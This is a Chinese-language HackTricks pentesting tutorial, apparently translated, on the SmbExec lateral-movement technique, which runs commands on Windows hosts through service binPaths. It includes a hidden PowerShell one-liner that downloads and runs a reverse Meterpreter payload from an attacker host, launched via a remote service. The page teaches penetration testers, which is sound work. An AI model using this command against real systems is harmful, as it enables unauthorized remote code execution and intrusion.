# SmbExec/ScExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

## 它是如何工作的

**Smbexec的工作方式类似于Psexec。**在这个例子中，**不是将"_binpath_"指向受害者内部的恶意可执行文件**，而是将其指向**cmd.exe或powershell.exe**，其中一个将下载并执行后门。

## **SMBExec**

让我们从攻击者和目标的角度来看smbexec的运行情况：

![](../../.gitbook/assets/smbexec\_prompt.png)

所以我们知道它创建了一个名为"BTOBTO"的服务。但是当我们执行`sc query`命令时，该服务在目标机器上不存在。系统日志揭示了发生了什么：

![](../../.gitbook/assets/smbexec\_service.png)

服务文件名包含一个要执行的命令字符串（%COMSPEC%指向cmd.exe的绝对路径）。它将要执行的命令回显到一个bat文件中，将stdout和stderr重定向到一个临时文件，然后执行bat文件并删除它。回到Kali，Python脚本通过SMB拉取输出文件，并在我们的"伪shell"中显示内容。对于我们在"shell"中输入的每个命令，都会创建一个新的服务，并重复该过程。这就是为什么它不需要放置一个二进制文件，而只是将每个所需的命令作为一个新的服务执行。这绝对更隐蔽，但正如我们所见，每个执行的命令都会创建一个事件日志。这是一种非常聪明的获取非交互式"shell"的方法！

## 手动SMBExec

**或通过服务执行命令**

正如smbexec所示，可以直接从服务的binPaths中执行命令，而不需要一个二进制文件。如果你只需要在目标Windows机器上执行一个任意命令，这可能是一个有用的技巧。作为一个快速的例子，让我们使用Metasploit的`web_delivery`模块，并选择一个带有反向Meterpreter有效负载的PowerShell目标。设置监听器并告诉我们在目标机器上要执行的命令：
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
```
从我们的Windows攻击盒中，我们创建了一个远程服务（"metpsh"），并将binPath设置为使用我们的有效负载执行cmd.exe：

![](../../.gitbook/assets/sc\_psh\_create.png)

然后启动它：

![](../../.gitbook/assets/sc\_psh\_start.png)

它报错了，因为我们的服务没有响应，但是如果我们查看Metasploit监听器，我们会看到回调已经完成并执行了有效负载。

所有的信息都从这里提取出来：[https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
